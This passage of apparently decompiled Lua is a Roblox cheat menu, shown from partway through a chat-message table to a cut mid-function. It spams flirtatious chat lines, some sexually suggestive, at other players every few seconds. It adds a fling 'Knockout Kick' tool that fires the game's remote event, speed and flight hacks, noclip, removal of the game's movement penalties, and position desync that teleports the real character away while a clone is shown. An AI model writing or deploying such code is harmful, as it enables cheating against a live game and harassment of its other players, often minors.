	"do you have a name, or can I call you mine?",
	"are you a keyboard? cuz you\226\128\153re my type",
	"are you a Wi-Fi signal? cuz I feel a strong connection",
	"if you were a vegetable, you\226\128\153d be a cute-cumber",
	"you must be tired, cuz you\226\128\153ve been running through my mind all day",
	"is your aura Wi-Fi enabled? cuz I\226\128\153m picking up good vibes",
	"are you a charger? cuz without you I\226\128\153d die",
	"you must be a lottery ticket, cuz I feel lucky around you",
	"are you made of copper and tellurium? cuz you\226\128\153re Cu-Te",
	"you must be a sunrise, cuz you brighten my morning",
	"are you a puzzle? cuz I can\226\128\153t stop thinking about how to figure you out",
	"you must be a time traveler, cuz I see you in my future",
	"you\226\128\153re like a software update, you just made my day better",
	"if you were a meme, you\226\128\153d be legendary",
	"are you a star? cuz your light\226\128\153s impossible to ignore",
	"i like your vibe, it\226\128\153s way above 9000",
	"are you a donut? cuz you\226\128\153re sweet and round\226\128\166 perfect",
	"you\226\128\153ve got a smile that could break the internet",
	"you must be made of stardust, cuz you shine",
	"if i followed you home, would you keep me? ;)",
	"your energy is like caffeine\226\128\166 makes me feel alive",
	"you\226\128\153re like a plot twist, unexpected and amazing",
	"i like how your brain works, it\226\128\153s chaotic genius",
	"are you a rainbow? cuz you color my world",
	"you\226\128\153ve got that je ne sais quoi that breaks physics",
	"you must be a rare item, cuz everyone\226\128\153s looking for you",
	"your aura just hacked my attention",
	"i like how your presence crashes all my distractions",
	"you\226\128\153ve got charisma that should be illegal",
	"are you a potion? cuz i feel enchanted",
	"you\226\128\153re like my favorite song on repeat",
	"if i were a cat, i\226\128\153d purr every time you\226\128\153re near",
	"you\226\128\153ve got a gravitational pull i can\226\128\153t resist",
	"you make ordinary moments feel cinematic",
	"you\226\128\153re like a glitch in reality\226\128\166 in the best way",
	"i like your style, it\226\128\153s meta-level impressive",
	"you\226\128\153re the kind of mystery i\226\128\153d never want to solve",
	"are you a comic book hero? cuz my heart just went kapow",
	"you\226\128\153re like a bonus level in life\226\128\166 unexpected and fun",
	"your energy should have its own theme song",
	"i like the way you break all my expectations",
	"you\226\128\153re like a secret code only my brain can decrypt",
	"you make multitasking look like an art form",
	"your aura should come with a warning sign",
	"i like how you turn everything you touch into gold",
	"you\226\128\153re like a DLC pack for life\226\128\166 way better than expected",
	"your confidence is basically cheat codes",
	"you\226\128\153re like a perfect combo move, flawless every time",
	"heyyy baby... wanna see something ? >3",
	"i think i can make you happy with one surprise sausage"
}
isEnabled = false
shuffledRizzMessages = {}
currentRizzIndex = 1
function shuffle(p734)
	for v735 = #p734, 2, -1 do
		local v736 = math.random(v735)
		local v737 = p734[v736]
		p734[v736] = p734[v735]
		p734[v735] = v737
	end
end
function resetShuffledRizz()
	shuffledRizzMessages = {}
	for v738 = 1, #rizzMessages do
		table.insert(shuffledRizzMessages, rizzMessages[v738])
	end
	shuffle(shuffledRizzMessages)
	currentRizzIndex = 1
end
function sendRizzMessages()
	if #shuffledRizzMessages == 0 then
		resetShuffledRizz()
	end
	while isEnabled do
		if channel then
			channel:SendAsync(shuffledRizzMessages[currentRizzIndex])
		end
		currentRizzIndex = currentRizzIndex + 1
		if currentRizzIndex > #shuffledRizzMessages then
			resetShuffledRizz()
		end
		wait(3)
	end
end
v491:AddToggle("RizzTalk", {
	["Text"] = "Rizz Talk",
	["Default"] = false
}):OnChanged(function(p739)
	isEnabled = p739
	if p739 then
		spawn(sendRizzMessages)
	end
end)
getgenv().Test = false
getgenv().SoundId = "8323804973"
getgenv().ToolEnabled = false
getgenv().CreateTool = function()
	getgenv().Tool = Instance.new("Tool")
	getgenv().Tool.RequiresHandle = false
	getgenv().Tool.Name = "[Kick]"
	getgenv().Tool.TextureId = "rbxassetid://483225199"
	getgenv().Animation = Instance.new("Animation")
	getgenv().Animation.AnimationId = "rbxassetid://138408477594658"
	getgenv().Tool.Activated:Connect(function()
		getgenv().Test = true
		getgenv().Player = game.Players.LocalPlayer
		getgenv().Character = getgenv().Player.Character or getgenv().Player.CharacterAdded:Wait()
		getgenv().Humanoid = getgenv().Character:FindFirstChild("Humanoid")
		if getgenv().Humanoid then
			getgenv().AnimationTrack = getgenv().Humanoid:LoadAnimation(getgenv().Animation)
			getgenv().AnimationTrack:AdjustSpeed(3.4)
			getgenv().AnimationTrack:Play()
		end
		task.wait(0.6)
		getgenv().Boombox = game.Players.LocalPlayer.Backpack:FindFirstChild("[Boombox]")
		if getgenv().Boombox then
			getgenv().Boombox.Parent = game.Players.LocalPlayer.Character
			game:GetService("ReplicatedStorage").MainEvent:FireServer("Boombox", tonumber(getgenv().SoundId))
			getgenv().Boombox.RequiresHandle = false
			getgenv().Boombox.Parent = game.Players.LocalPlayer.Backpack
			task.wait(1)
			game:GetService("ReplicatedStorage").MainEvent:FireServer("BoomboxStop")
		else
			getgenv().Sound = Instance.new("Sound", workspace)
			getgenv().Sound.SoundId = "rbxassetid://" .. getgenv().SoundId
			getgenv().Sound:Play()
			task.wait(1)
			getgenv().Sound:Stop()
		end
		wait(1.4)
		getgenv().Test = false
	end)
	getgenv().Tool.Parent = game.Players.LocalPlayer:WaitForChild("Backpack")
end
getgenv().RemoveTool = function()
	getgenv().Player = game.Players.LocalPlayer
	getgenv().Tool = getgenv().Player.Backpack:FindFirstChild("[Kick]") or getgenv().Player.Character:FindFirstChild("[Kick]")
	if getgenv().Tool then
		getgenv().Tool:Destroy()
	end
end
game:GetService("RunService").Heartbeat:Connect(function()
	if getgenv().Test then
		getgenv().Character = game.Players.LocalPlayer.Character
		if not getgenv().Character then
			return
		end
		getgenv().HumanoidRootPart = getgenv().Character:FindFirstChild("HumanoidRootPart")
		if not getgenv().HumanoidRootPart then
			return
		end
		getgenv().originalVelocity = getgenv().HumanoidRootPart.Velocity
		getgenv().HumanoidRootPart.Velocity = Vector3.new(getgenv().HumanoidRootPart.CFrame.LookVector.X * 1200, 1200, getgenv().HumanoidRootPart.CFrame.LookVector.Z * 1200)
		game:GetService("RunService").RenderStepped:Wait()
		getgenv().HumanoidRootPart.Velocity = getgenv().originalVelocity
	end
end)
v491:AddToggle("ToolToggle", {
	["Text"] = "Knockout Kick",
	["Default"] = false,
	["Callback"] = function(p740)
		getgenv().ToolEnabled = p740
		if p740 then
			getgenv().CreateTool()
		else
			getgenv().RemoveTool()
		end
	end
})
game.Players.LocalPlayer.CharacterAdded:Connect(function()
	if getgenv().ToolEnabled then
		task.wait(1)
		getgenv().CreateTool()
	end
end)
local v_u_741 = v22:AddLeftGroupbox("Movement")
local v_u_742 = false
local v_u_743 = false
local v_u_744 = false
local v_u_745 = 16
local v_u_746 = "CFrame"
local v_u_747 = Vector3.zero
local v_u_748 = false
local v_u_749 = false
local v_u_750 = false
local v_u_751 = 16
local v_u_752 = "Minecraft"
local v_u_753 = nil
local v_u_754 = true
v_u_561.TextBoxFocused:Connect(function()
	-- upvalues: (ref) v_u_754
	v_u_754 = false
end)
v_u_561.TextBoxFocusReleased:Connect(function()
	-- upvalues: (ref) v_u_754
	v_u_754 = true
end)
local function v_u_757()
	-- upvalues: (ref) v_u_663
	local v755 = v_u_663.Character
	local v756 = v755 and v755:FindFirstChildOfClass("Humanoid")
	if v756 then
		v756.WalkSpeed = 16
	end
end
local function v_u_760()
	-- upvalues: (ref) v_u_663
	local v758 = v_u_663.Character
	local v759 = v758 and v758:FindFirstChildOfClass("Humanoid")
	if v759 then
		v759.PlatformStand = false
	end
end
local function v_u_764()
	-- upvalues: (ref) v_u_663
	local v761 = v_u_663.Character
	if v761 then
		local v762 = v761:FindFirstChild("HumanoidRootPart")
		local v763 = v761:FindFirstChildOfClass("Humanoid")
		if v762 and v763 then
			v763.PlatformStand = true
			v762.Velocity = Vector3.zero
		end
	end
end
local function v_u_767()
	-- upvalues: (ref) v_u_663
	local v765 = v_u_663.Character
	local v766 = v765 and v765:FindFirstChildOfClass("Humanoid")
	if v766 then
		v766.PlatformStand = false
	end
end
local function v_u_775()
	-- upvalues: (ref) v_u_663, (ref) v_u_754, (ref) v_u_561, (ref) v_u_661, (ref) v_u_745, (ref) v_u_746, (ref) v_u_742, (ref) v_u_743, (ref) v_u_747, (ref) v_u_744
	local v768 = v_u_663.Character
	if v768 and v_u_754 and not v_u_561:GetFocusedTextBox() then
		local v769 = v768:FindFirstChild("HumanoidRootPart")
		if v769 then
			local v770 = Vector3.new()
			local v771 = workspace.CurrentCamera.CFrame
			if v_u_561:IsKeyDown(Enum.KeyCode.W) then
				v770 = v770 + v771.LookVector
			end
			if v_u_561:IsKeyDown(Enum.KeyCode.S) then
				v770 = v770 - v771.LookVector
			end
			if v_u_561:IsKeyDown(Enum.KeyCode.A) then
				v770 = v770 - v771.RightVector
			end
			if v_u_561:IsKeyDown(Enum.KeyCode.D) then
				v770 = v770 + v771.RightVector
			end
			local v772 = Vector3.new(v770.X, 0, v770.Z)
			local v773 = v_u_661.Heartbeat:Wait() or 0.016
			if v772.Magnitude <= 0 then
				if v_u_746 == "Velocity" and v_u_743 then
					v_u_747 = v_u_747:Lerp(Vector3.zero, 0.3)
					v769.Velocity = Vector3.new(v_u_747.X, v769.Velocity.Y, v_u_747.Z)
				end
			else
				local v774 = v772.Unit * v_u_745
				if v_u_746 ~= "CFrame" or not v_u_742 then
					if v_u_746 ~= "Velocity" or not v_u_743 then
						if v_u_746 == "Impulse" and v_u_744 then
							v769:ApplyImpulse(v774 * v769.AssemblyMass)
						end
					else
						v_u_747 = v_u_747:Lerp(v774, 0.3)
						v769.Velocity = Vector3.new(v_u_747.X, v769.Velocity.Y, v_u_747.Z)
					end
				else
					v769.CFrame = v769.CFrame + v774 * v773
				end
			end
		end
	else
		return
	end
end
local function v_u_792()
	-- upvalues: (ref) v_u_663, (ref) v_u_661, (ref) v_u_752, (ref) v_u_748, (ref) v_u_754, (ref) v_u_753, (ref) v_u_561, (ref) v_u_751, (ref) v_u_749, (ref) v_u_750
	local v776 = v_u_663.Character
	if v776 then
		local v777 = v776:FindFirstChild("HumanoidRootPart")
		local v778 = v776:FindFirstChildOfClass("Humanoid")
		if v777 and v778 then
			v778.PlatformStand = true
			local v779 = v_u_661.Heartbeat:Wait() or 0.016
			local v780 = workspace.CurrentCamera.CFrame
			if v_u_752 ~= "Minecraft" or not v_u_748 then
				if v_u_752 ~= "Classic" or not v_u_749 then
					if v_u_752 == "Velocity" and v_u_750 then
						if not v_u_754 then
							v777.Velocity = Vector3.zero
							v777.RotVelocity = Vector3.zero
							return
						end
						local v781 = v780.LookVector
						local v782 = v780.RightVector
						local v783 = Vector3.new()
						if v_u_561:IsKeyDown(Enum.KeyCode.W) then
							v783 = v783 + v781
						end
						if v_u_561:IsKeyDown(Enum.KeyCode.S) then
							v783 = v783 - v781
						end
						if v_u_561:IsKeyDown(Enum.KeyCode.A) then
							v783 = v783 - v782
						end
						if v_u_561:IsKeyDown(Enum.KeyCode.D) then
							v783 = v783 + v782
						end
						if v783.Magnitude <= 0 then
							v777.Velocity = Vector3.zero
						else
							v777.Velocity = v783.Unit * v_u_751
						end
						v777.RotVelocity = Vector3.zero
					end
				else
					local v784 = Vector3.new()
					local v785 = v780.LookVector
					local v786 = v780.RightVector
					if not v_u_754 then
						v777.Velocity = Vector3.zero
						v777.RotVelocity = Vector3.zero
						return
					end
					if v_u_561:IsKeyDown(Enum.KeyCode.W) then
						v784 = v784 + v785
					end
					if v_u_561:IsKeyDown(Enum.KeyCode.S) then
						v784 = v784 - v785
					end
					if v_u_561:IsKeyDown(Enum.KeyCode.A) then
						v784 = v784 - v786
					end
					if v_u_561:IsKeyDown(Enum.KeyCode.D) then
						v784 = v784 + v786
					end
					if v784.Magnitude > 0 then
						local v787 = v784.Unit * v_u_751 * v779
						v777.CFrame = v777.CFrame + v787
					end
					v777.Velocity = Vector3.zero
					v777.RotVelocity = Vector3.zero
				end
			else
				if not v_u_754 then
					v_u_753 = v777.Position.Y
					v777.CFrame = CFrame.new(v777.Position.X, v_u_753, v777.Position.Z)
					v777.Velocity = Vector3.zero
					v777.RotVelocity = Vector3.zero
					return
				end
				local v788 = Vector3.new()
				if v_u_561:IsKeyDown(Enum.KeyCode.W) then
					v788 = v788 + Vector3.new(v780.LookVector.X, 0, v780.LookVector.Z)
				end
				if v_u_561:IsKeyDown(Enum.KeyCode.S) then
					v788 = v788 - Vector3.new(v780.LookVector.X, 0, v780.LookVector.Z)
				end
				if v_u_561:IsKeyDown(Enum.KeyCode.A) then
					v788 = v788 - Vector3.new(v780.RightVector.X, 0, v780.RightVector.Z)
				end
				if v_u_561:IsKeyDown(Enum.KeyCode.D) then
					v788 = v788 + Vector3.new(v780.RightVector.X, 0, v780.RightVector.Z)
				end
				local v789 = v_u_561:IsKeyDown(Enum.KeyCode.Space) and 1 or (v_u_561:IsKeyDown(Enum.KeyCode.LeftControl) and -1 or 0)
				if v_u_753 == nil or math.abs(v777.Position.Y - v_u_753) > 5 then
					v_u_753 = v777.Position.Y
				end
				if v789 ~= 0 then
					v_u_753 = v_u_753 + v789 * v_u_751 * v779
				end
				local v790
				if v788.Magnitude <= 0 then
					v790 = Vector3.zero
				else
					v790 = v788.Unit * v_u_751 * v779
				end
				local v791 = v777.Position + Vector3.new(v790.X, 0, v790.Z)
				v777.CFrame = CFrame.new(v791.X, v_u_753, v791.Z)
				v777.Velocity = Vector3.zero
				v777.RotVelocity = Vector3.zero
			end
		end
	else
		return
	end
end
v_u_661.Heartbeat:Connect(function()
	-- upvalues: (ref) v_u_742, (ref) v_u_743, (ref) v_u_744, (ref) v_u_775, (ref) v_u_748, (ref) v_u_749, (ref) v_u_750, (ref) v_u_792, (ref) v_u_760, (ref) v_u_753
	if v_u_742 or (v_u_743 or v_u_744) then
		v_u_775()
	end
	if v_u_748 or (v_u_749 or v_u_750) then
		v_u_792()
	else
		v_u_760()
		v_u_753 = nil
	end
end)
local v793 = v_u_741
v_u_741.AddToggle(v793, "SpeedCFrameToggle", {
	["Text"] = "Speed",
	["Default"] = false
}):AddKeyPicker("SpeedToggleBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Speed CFrame",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p794)
		-- upvalues: (ref) v_u_754
		if v_u_754 then
			Toggles.SpeedCFrameToggle:SetValue(p794)
		end
	end
}):OnChanged(function(p795)
	-- upvalues: (ref) v_u_742, (ref) v_u_746, (ref) v_u_743, (ref) v_u_744, (ref) v_u_767, (ref) v_u_757
	local v796
	if v_u_746 ~= "CFrame" or not p795 then
		v796 = false
	else
		v796 = p795
	end
	v_u_742 = v796
	local v797
	if v_u_746 ~= "Velocity" or not p795 then
		v797 = false
	else
		v797 = p795
	end
	v_u_743 = v797
	local v798
	if v_u_746 ~= "Impulse" or not p795 then
		v798 = false
	else
		v798 = p795
	end
	v_u_744 = v798
	if not p795 then
		v_u_767()
		v_u_757()
		v_u_744 = false
		v_u_743 = false
		v_u_742 = false
	end
end)
local v799 = v_u_741
local v801 = {
	["Text"] = "Speed Mode",
	["Default"] = "CFrame",
	["Values"] = { "CFrame", "Velocity", "Impulse" },
	["Callback"] = function(p800)
		-- upvalues: (ref) v_u_746, (ref) v_u_742, (ref) v_u_743, (ref) v_u_744
		v_u_746 = p800
		if p800 == "CFrame" then
			v_u_742 = Toggles.SpeedCFrameToggle.Value
			v_u_743 = false
			v_u_744 = false
		elseif p800 == "Velocity" then
			v_u_743 = Toggles.SpeedCFrameToggle.Value
			v_u_742 = false
			v_u_744 = false
		elseif p800 == "Impulse" then
			v_u_744 = Toggles.SpeedCFrameToggle.Value
			v_u_742 = false
			v_u_743 = false
		end
	end
}
v_u_741.AddDropdown(v799, "SpeedMoveMethodDropdown", v801)
local v802 = v_u_741
local v804 = {
	["Text"] = "Speed Amount",
	["Min"] = 1,
	["Max"] = 1500,
	["Default"] = 16,
	["Rounding"] = 0,
	["Callback"] = function(p803)
		-- upvalues: (ref) v_u_745
		v_u_745 = p803
	end
}
v_u_741.AddSlider(v802, "SpeedCFrameSlider", v804)
local v805 = v_u_741
v_u_741.AddToggle(v805, "No Jump Cooldown", {
	["Text"] = "No Jump Cooldown",
	["Default"] = false,
	["Callback"] = function(p806)
		if p806 then
			local v807 = game.Players.LocalPlayer
			local function v809(p808)
				p808:WaitForChild("Humanoid").UseJumpPower = false
			end
			v807.CharacterAdded:Connect(v809)
			if v807.Character then
				v809(v807.Character)
			end
		end
	end
})
local v810 = v_u_741
local v818 = {
	["Text"] = "No Slow Down",
	["Default"] = false,
	["Callback"] = function(p811)
		-- upvalues: (ref) v_u_661
		if p811 then
			v_u_661:BindToRenderStep("NoSlowDown", 0, function()
				local v812 = player.Character
				if v812 then
					local v813 = v812:FindFirstChild("BodyEffects")
					if v813 then
						local v814 = v813:FindFirstChild("Movement")
						if v814 then
							local v815 = v814:FindFirstChild("NoWalkSpeed")
							if v815 then
								v815:Destroy()
							end
							local v816 = v814:FindFirstChild("ReduceWalk")
							if v816 then
								v816:Destroy()
							end
							local v817 = v814:FindFirstChild("NoJumping")
							if v817 then
								v817:Destroy()
							end
						end
						if v813:FindFirstChild("Reload") and v813.Reload.Value == true then
							v813.Reload.Value = false
						end
					end
				else
					return
				end
			end)
		else
			v_u_661:UnbindFromRenderStep("NoSlowDown")
		end
	end
}
v_u_741.AddToggle(v810, "No Slow Down", v818)
local v819 = v_u_741
local v831 = {
	["Text"] = "Noclip",
	["Default"] = false,
	["Callback"] = function(p820)
		-- upvalues: (ref) v_u_661, (ref) v_u_663
		if p820 then
			if NoclipConnection then
				NoclipConnection:Disconnect()
			end
			NoclipConnection = v_u_661.Stepped:Connect(function()
				-- upvalues: (ref) v_u_663
				local v821 = v_u_663.Character
				if v821 then
					local v822, v823, v824 = ipairs(v821:GetDescendants())
					while true do
						local v825
						v824, v825 = v822(v823, v824)
						if v824 == nil then
							break
						end
						if v825:IsA("BasePart") then
							v825.CanCollide = false
						end
					end
				end
			end)
		else
			if NoclipConnection then
				NoclipConnection:Disconnect()
				NoclipConnection = nil
			end
			task.wait(0.1)
			local v826 = v_u_663.Character
			if v826 then
				local v827, v828, v829 = ipairs(v826:GetDescendants())
				while true do
					local v830
					v829, v830 = v827(v828, v829)
					if v829 == nil then
						break
					end
					if v830:IsA("BasePart") and v830.Name ~= "HumanoidRootPart" then
						v830.CanCollide = true
					end
				end
			end
		end
	end
}
v_u_741.AddToggle(v819, "NoclipToggle", v831)
v_u_663.CharacterAdded:Connect(function(p832)
	-- upvalues: (ref) v_u_741
	if v_u_741 and (v_u_741:Get("NoclipToggle") and v_u_741:Get("NoclipToggle").Value) then
		task.wait(0.3)
		local v833, v834, v835 = ipairs(p832:GetDescendants())
		while true do
			local v836
			v835, v836 = v833(v834, v835)
			if v835 == nil then
				break
			end
			if v836:IsA("BasePart") then
				v836.CanCollide = false
			end
		end
	end
end)
local v837 = v_u_741
v_u_741.AddToggle(v837, "FlightCFrameToggle", {
	["Text"] = "Flight",
	["Default"] = false
}):AddKeyPicker("FlightToggleBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Flight Toggle",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p838)
		-- upvalues: (ref) v_u_754
		if v_u_754 then
			Toggles.FlightCFrameToggle:SetValue(p838)
		end
	end
}):OnChanged(function(p839)
	-- upvalues: (ref) v_u_752, (ref) v_u_748, (ref) v_u_749, (ref) v_u_750, (ref) v_u_764, (ref) v_u_767, (ref) v_u_760
	if v_u_752 ~= "Minecraft" then
		if v_u_752 ~= "Classic" then
			if v_u_752 == "Velocity" then
				v_u_750 = p839
				v_u_748 = false
				v_u_749 = false
			end
		else
			v_u_749 = p839
			v_u_748 = false
			v_u_750 = false
		end
	else
		v_u_748 = p839
		v_u_749 = false
		v_u_750 = false
	end
	if not p839 then
		v_u_764()
		task.spawn(function()
			-- upvalues: (ref) v_u_767
			task.wait(0.01)
			v_u_767()
			task.wait(2)
			v_u_767()
		end)
		v_u_760()
	end
end)
local v840 = v_u_741
local v845 = {
	["Text"] = "Flight Mode",
	["Default"] = "Minecraft",
	["Values"] = { "Minecraft", "Classic", "Velocity" },
	["Callback"] = function(p841)
		-- upvalues: (ref) v_u_752, (ref) v_u_663, (ref) v_u_749, (ref) v_u_748, (ref) v_u_750
		v_u_752 = p841
		local v842 = v_u_663.Character
		if v842 then
			local v843 = v842:FindFirstChildOfClass("Humanoid")
			local v844 = v842:FindFirstChild("HumanoidRootPart")
			if v_u_752 ~= "Classic" then
				if v_u_752 ~= "Minecraft" then
					if v_u_752 == "Velocity" then
						v_u_750 = Toggles.FlightCFrameToggle.Value
						v_u_748 = false
						v_u_749 = false
						if v843 and v844 then
							v843.PlatformStand = v_u_750
							v844.Velocity = Vector3.zero
							v844.RotVelocity = Vector3.zero
						end
					end
				else
					v_u_748 = Toggles.FlightCFrameToggle.Value
					v_u_749 = false
					v_u_750 = false
					if v843 then
						v843.PlatformStand = v_u_748
					end
				end
			else
				v_u_749 = Toggles.FlightCFrameToggle.Value
				v_u_748 = false
				v_u_750 = false
				if v843 and v844 then
					v843.PlatformStand = v_u_749
					v844.Velocity = Vector3.zero
					v844.RotVelocity = Vector3.zero
				end
			end
		end
	end
}
v_u_741.AddDropdown(v840, "FlightModeDropdown", v845)
local v846 = v_u_741
local v848 = {
	["Text"] = "Flight Amount",
	["Min"] = 1,
	["Max"] = 1500,
	["Default"] = 16,
	["Rounding"] = 0,
	["Callback"] = function(p847)
		-- upvalues: (ref) v_u_751
		v_u_751 = p847
	end
}
v_u_741.AddSlider(v846, "FlightAmountSlider", v848)
TabBox = v22:AddRightTabbox()
Tab1 = TabBox:AddTab("Pos Desync")
Tab2 = TabBox:AddTab("Fake Pos")
rng = Random.new()
desyncEnabled = false
desyncMode = "Custom"
randomMode = false
autoDesyncOnDamage = false
originalCFrame = nil
desyncThread = nil
character = nil
hrp = nil
humanoid = nil
lastHealth = nil
customPos = Vector3.new(0, 0, 0)
Clone = nil
underMapSpeed = 999999
viewMode = "FakeClone"
Services = {
	["RunService"] = game:GetService("RunService"),
	["LocalPlayer"] = game:GetService("Players").LocalPlayer,
	["UserInputService"] = game:GetService("UserInputService")
}
function IsChatFocused()
	return Services.UserInputService:GetFocusedTextBox() ~= nil
end
function randomLarge(p849, p850)
	return p849 + rng:NextNumber() * (p850 - p849)
end
function getRandomSkyPosition()
	baseX = rng:NextNumber(-995000, 995000)
	baseY = rng:NextNumber(22000, 98000)
	baseZ = rng:NextNumber(-995000, 995000)
	time = tick()
	offsetX = math.sin(time * 3 + baseX) * 5100
	offsetY = math.cos(time * 2 + baseY) * 2100
	offsetZ = math.sin(time * 4 + baseZ) * 5100
	return Vector3.new(baseX + offsetX, baseY + offsetY, baseZ + offsetZ)
end
function getIntermediateSkyPosition()
	baseX = rng:NextNumber(-1000000, 1000000)
	baseY = rng:NextNumber(45000, 85000)
	baseZ = rng:NextNumber(-1000000, 1000000)
	time = tick()
	offsetX = (math.sin(time * 5 + baseX) + rng:NextNumber(-1, 1)) * 3000
	offsetY = (math.cos(time * 3 + baseY) + rng:NextNumber(-0.5, 0.5)) * 1500
	offsetZ = (math.sin(time * 6 + baseZ) + rng:NextNumber(-1, 1)) * 3000
	return Vector3.new(baseX + offsetX, baseY + offsetY, baseZ + offsetZ)
end
function getExtremeSkyPosition()
	function crazyRand()
		return rng:NextNumber(-1000000000, 1000000000)
	end
	return Vector3.new(crazyRand(), rng:NextNumber(50000000, 1000000000), crazyRand())
end
function getUltimateUndergroundPosition()
	return Vector3.new(randomLarge(-1000000000, 1000000000), 100000000, randomLarge(-1000000000, 1000000000))
end
function getSilentSkyPosition()
	return Vector3.new(randomLarge(-1000000, 1000000), -25, randomLarge(-1000000, 1000000))
end
function getRandomModePosition()
	function randomSigned(p851, p852)
		sign = rng:NextInteger(0, 1) == 1 and 1 or -1
		return rng:NextNumber(p851, p852) * sign
	end
	heightChoice = rng:NextInteger(1, 3)
	if heightChoice ~= 1 then
		if heightChoice ~= 2 then
			y = rng:NextNumber(10000000, 1000000000)
		else
			y = rng:NextNumber(120000, 10000000)
		end
	else
		y = rng:NextNumber(1000, 50000)
	end
	x = randomSigned(100000, 10000000)
	z = randomSigned(100000, 10000000)
	return Vector3.new(x, y, z)
end
function enableAntiFling()
	if hrp and hrp.Parent then
		local v853, v854, v855 = ipairs(hrp.Parent:GetDescendants())
		while true do
			local v856
			v855, v856 = v853(v854, v855)
			if v855 == nil then
				break
			end
			if v856:IsA("BasePart") then
				v856.Velocity = Vector3.zero
				v856.RotVelocity = Vector3.zero
				v856.AssemblyLinearVelocity = Vector3.zero
				v856.AssemblyAngularVelocity = Vector3.zero
				v856.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
			end
		end
	end
end
function disableAntiFling()
	if hrp and hrp.Parent then
		local v857, v858, v859 = ipairs(hrp.Parent:GetDescendants())
		while true do
			local v860
			v859, v860 = v857(v858, v859)
			if v859 == nil then
				break
			end
			if v860:IsA("BasePart") then
				v860.CustomPhysicalProperties = PhysicalProperties.new(1, 0.3, 0.5)
			end
		end
	end
end
function enableDesync()
	-- upvalues: (ref) v_u_742, (ref) v_u_743, (ref) v_u_744, (ref) v_u_745, (ref) v_u_748, (ref) v_u_749, (ref) v_u_750, (ref) v_u_752, (ref) v_u_561, (ref) v_u_751
	if not desyncEnabled and hrp then
		desyncEnabled = true
		originalCFrame = hrp.CFrame
		Char = Services.LocalPlayer.Character
		AnimTracks = {}
		currentAnim = nil
		Char.Archivable = true
		function novel(p861)
			p861.AssemblyLinearVelocity = Vector3.zero
			p861.AssemblyAngularVelocity = Vector3.zero
			p861.Velocity = Vector3.zero
		end
		function IsAnimPlaying(p862, p863)
			local v864, v865, v866 = pairs(p862:GetPlayingAnimationTracks())
			while true do
				local v867
				v866, v867 = v864(v865, v866)
				if v866 == nil then
					break
				end
				if v867.Animation == p863 then
					return true
				end
			end
			return false
		end
		function AnimPlay(p868, p869, p870)
			if not IsAnimPlaying(p868, p869) then
				if currentAnim then
					currentAnim:Stop()
				end
				currentAnim = p868:LoadAnimation(p869)
				currentAnim:Play()
				currentAnim:AdjustSpeed(p870 or 1)
			end
		end
		function AnimCheck(p871, p872)
			state = p871:GetState()
			if state ~= Enum.HumanoidStateType.Jumping then
				if state ~= Enum.HumanoidStateType.Freefall then
					if p872.Magnitude <= 0 then
						AnimPlay(p871, AnimTracks.Idle)
					else
						AnimPlay(p871, AnimTracks.Run, 1.2)
					end
				else
					AnimPlay(p871, AnimTracks.Fall)
				end
			else
				AnimPlay(p871, AnimTracks.Jump)
			end
		end
		function LoadAnimations()
			AnimateScript = Char:FindFirstChild("Animate")
			if AnimateScript then
				AnimTracks.Run = AnimateScript.run.RunAnim
				AnimTracks.Idle = AnimateScript.idle.Animation1
				AnimTracks.Jump = AnimateScript.jump.JumpAnim
				AnimTracks.Fall = AnimateScript.fall.FallAnim
			end
		end
		LoadAnimations()
		Clone = Char:Clone()
		Clone.Parent = workspace
		if viewMode ~= "FakeClone" then
			workspace.Camera.CameraSubject = workspace.Camera
			workspace.Camera.CameraType = Enum.CameraType.Scriptable
			local v873, v874, v875 = ipairs(Clone:GetDescendants())
			while true do
				local v876
				v875, v876 = v873(v874, v875)
				if v875 == nil then
					break
				end
				if v876:IsA("BasePart") or (v876:IsA("Decal") or (v876:IsA("Texture") or v876:IsA("Face"))) then
					v876.Transparency = 1
				end
			end
		else
			workspace.Camera.CameraSubject = Clone.Humanoid
		end
		local v877, v878, v879 = ipairs(Clone:GetDescendants())
		while true do
			local v880
			v879, v880 = v877(v878, v879)
			if v879 == nil then
				break
			end
			if v880:IsA("BasePart") then
				v880.Velocity = Vector3.zero
				v880.RotVelocity = Vector3.zero
				v880.AssemblyLinearVelocity = Vector3.zero
				v880.AssemblyAngularVelocity = Vector3.zero
			end
		end
		desyncThread = Services.RunService.Heartbeat:Connect(function()
			-- upvalues: (ref) v_u_742, (ref) v_u_743, (ref) v_u_744, (ref) v_u_745, (ref) v_u_748, (ref) v_u_749, (ref) v_u_750, (ref) v_u_752, (ref) v_u_561, (ref) v_u_751
			if desyncEnabled and hrp then
				if randomMode then
					targetCFrame = CFrame.new(getRandomModePosition())
				elseif desyncMode ~= "Custom" then
					if desyncMode ~= "Version 1" then
						if desyncMode ~= "Version 2" then
							if desyncMode ~= "Silent Version" then
								if desyncMode ~= "Extreme Version" then
									if desyncMode ~= "Ultimate Version" then
										targetCFrame = originalCFrame
									else
										targetCFrame = CFrame.new(getUltimateUndergroundPosition())
									end
								else
									targetCFrame = CFrame.new(getExtremeSkyPosition())
								end
							else
								targetCFrame = CFrame.new(getSilentSkyPosition())
							end
						else
							targetCFrame = CFrame.new(getIntermediateSkyPosition())
						end
					else
						targetCFrame = CFrame.new(getRandomSkyPosition())
					end
				else
					targetCFrame = CFrame.new(customPos)
				end
				hrp.CFrame = targetCFrame
				local v881, v882, v883 = pairs(Char:GetChildren())
				while true do
					local v884
					v883, v884 = v881(v882, v883)
					if v883 == nil then
						break
					end
					if v884:IsA("BasePart") then
						novel(v884)
					end
				end
				cloneHRP = Clone:FindFirstChild("HumanoidRootPart")
				delta = Services.RunService.Heartbeat:Wait() or 0.016
				if cloneHRP then
					camCF = workspace.CurrentCamera.CFrame
					moveDir = Vector3.zero
					verticalDir = 0
					flyDir = Vector3.zero
					if not IsChatFocused() then
						if Services.UserInputService:IsKeyDown(Enum.KeyCode.W) then
							moveDir = moveDir + camCF.LookVector
							flyDir = flyDir + camCF.LookVector
						end
						if Services.UserInputService:IsKeyDown(Enum.KeyCode.S) then
							moveDir = moveDir - camCF.LookVector
							flyDir = flyDir - camCF.LookVector
						end
						if Services.UserInputService:IsKeyDown(Enum.KeyCode.A) then
							moveDir = moveDir - camCF.RightVector
